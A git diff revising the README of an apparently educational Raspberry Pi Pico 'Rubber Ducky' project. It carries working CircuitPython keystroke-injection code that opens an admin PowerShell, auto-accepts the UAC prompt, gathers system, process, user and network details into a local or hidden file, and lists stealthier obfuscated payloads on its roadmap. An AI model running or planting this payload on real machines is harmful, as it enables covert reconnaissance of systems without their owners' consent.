@@ -1,42 +1,52 @@
-Sure! Here's the content formatted as a clean Markdown (`.md`) file ready for GitHub or your blog:
-
-````markdown
 # 🛠️ Project: Offline USB Rubber Ducky with Raspberry Pi Pico
 
-## 🎯 Goal  
-Create a *Rubber Ducky*-style device using a Raspberry Pi Pico that, when plugged into a computer, automatically collects system information and saves it locally for later analysis—without needing internet connection or external scripts.
+## Overview
 
-> This project was developed for educational purposes and testing in controlled environments (*ethical hacking lab environment*).
+This project aims to create an **offline USB Rubber Ducky** using a Raspberry Pi Pico. When connected to a computer, the device emulates a keyboard and automatically collects essential system information, saving it locally for later analysis—no internet connection required.
 
-## 📦 What is a Rubber Ducky?  
-A *USB Rubber Ducky* is a device that emulates a USB keyboard and can automatically type commands when connected to a machine. It is widely used in penetration testing and physical security demonstrations.
+> **Disclaimer:** This project is intended for educational purposes and controlled, ethical hacking environments only. Do not deploy on systems without explicit authorization.
 
-## ⚙️ Tools Used  
-- **Raspberry Pi Pico**  
-- **CircuitPython**  
-- [Adafruit HID Library](https://github.com/adafruit/Adafruit_CircuitPython_HID)  
-- **PowerShell** (for the payload)  
-- Base project: [`pico-ducky`](https://github.com/dbisu/pico-ducky) by [dbisu](https://github.com/dbisu)  
+---
 
-## 📋 What does the device do?  
-When the Raspberry Pi Pico is plugged into a PC:  
-1. It emulates a keyboard (HID).  
-2. Opens PowerShell with administrator privileges.  
-3. Executes a series of commands to collect:  
-   - System information (`Get-ComputerInfo`)  
-   - Active processes (`Get-Process`)  
-   - Local users (`Get-LocalUser`)  
-   - TCP network connections (`Get-NetTCPConnection`)  
-4. Saves all the information into a file named `audit.txt` on the Desktop.
+## What is a USB Rubber Ducky?
 
-### 📁 Hidden alternative locations  
+A [USB Rubber Ducky](https://hak5.org/products/usb-rubber-ducky) is a device that mimics a USB keyboard, allowing it to inject keystrokes and execute commands automatically when plugged into a target machine. It's widely used by penetration testers and security professionals to demonstrate the risks of physical access attacks.
+
+---
+
+## Features
+
+- **Hardware:** Raspberry Pi Pico microcontroller
+- **Firmware:** CircuitPython
+- **Libraries:** [Adafruit CircuitPython HID](https://github.com/adafruit/Adafruit_CircuitPython_HID)
+- **Payload:** PowerShell script for information gathering
+- **Base Project:** Forked and adapted from [`pico-ducky`](https://github.com/dbisu/pico-ducky) by [dbisu](https://github.com/dbisu)
+
+---
+
+## How It Works
+
+Upon connection to a Windows PC:
+
+1. The Pico emulates a USB keyboard (HID).
+2. Opens PowerShell with administrator privileges.
+3. Executes several commands to gather:
+    - System information (`Get-ComputerInfo`)
+    - Active processes (`Get-Process`)
+    - Local user accounts (`Get-LocalUser`)
+    - Network connections (`Get-NetTCPConnection`)
+4. Saves the collected data as `audit.txt` on the Desktop (or alternative hidden locations).
+
+**Alternative Storage Paths:**
 ```powershell
 $out = "$env:APPDATA\Microsoft\Windows\Recent\syscache.txt"
 # or
 $out = "C:\ProgramData\sysinfo.log"
-````
+```
 
-## 💻 Code (CircuitPython)
+---
+
+## CircuitPython Example Code
 
 ```python
 import time
@@ -49,23 +59,28 @@ from adafruit_hid.keycode import Keycode
 keyboard = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(keyboard)
 
-time.sleep(3)
+time.sleep(3)  # Wait for the host to be ready
 
+# Open Run dialog
 keyboard.press(Keycode.GUI, Keycode.R)
 keyboard.release_all()
 time.sleep(0.5)
 
+# Launch PowerShell
 layout.write("powershell\n")
 time.sleep(1)
 
+# Request admin privileges
 keyboard.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
 keyboard.release_all()
 time.sleep(1.2)
 
+# Accept UAC prompt (may require language/layout adjustment)
 keyboard.press(Keycode.ALT, Keycode.Y)
 keyboard.release_all()
 time.sleep(0.8)
 
+# PowerShell payload
 payload = (
     '$out = "$env:USERPROFILE\\Desktop\\audit.txt"; '
     'Get-ComputerInfo | Out-File $out; '
@@ -79,7 +94,9 @@ time.sleep(1)
 layout.write("exit\n")
 ```
 
-## 📷 Results
+---
+
+## Sample Output
 
 ```
 ComputerName           : VICTIM-PC
@@ -100,24 +117,31 @@ Admin                True
 Guest                False
 ```
 
-## 🛡️ Ethical Considerations
+---
 
-This type of project can be used for:
+## Ethical Considerations
 
-* Physical security testing
-* USB attack demonstrations
-* Cybersecurity labs
-* Penetration testing training
+This project demonstrates the importance of physical security and awareness of USB-based attacks. Use responsibly for:
 
-> **⚠️ Important:** Never use tools like this on systems you do not own or without explicit permission.
+- Security awareness training
+- Penetration testing (with permission)
+- Cybersecurity labs and demonstrations
 
-## 🔄 Next Steps
+> **Warning:** Unauthorized use of this tool is illegal and unethical. Always obtain explicit permission before testing any system.
 
-* Version with multiple selectable payloads (via physical button)
-* Screenshot and clipboard capture
-* Command obfuscation
-* System language detection (keyboard layout)
+---
 
-## 📌 Conclusion
+## Roadmap
 
-This project is a powerful demonstration of how an affordable device like the Raspberry Pi Pico can be used to automate complex tasks in seconds.
+- Support for multiple, selectable payloads (via physical button)
+- Screenshot and clipboard capture functionalities
+- Command obfuscation for stealthier payloads
+- Automatic system language detection (keyboard layout adaptation)
+
+---
+
+## Conclusion
+
+This project showcases how affordable microcontrollers like the Raspberry Pi Pico can automate complex, real-world security assessments. Properly used, it’s a powerful tool for learning, teaching, and raising awareness about the dangers of physical access and USB attacks.
+
+---
